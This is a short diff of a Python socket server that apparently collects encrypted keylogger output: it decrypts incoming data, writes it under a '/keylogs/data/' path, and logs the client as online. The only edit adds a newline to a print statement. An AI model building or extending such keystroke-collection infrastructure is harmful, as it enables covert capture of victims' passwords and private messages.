@@ -79,7 +79,7 @@ def receiver(port):
             data = client_socket.recv(1024)
             if data :
                 f.write(dechiffrement(data))
-                print(f"{client_address} - ONLINE")
+                print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
     client_socket.close()
     server_socket.close()
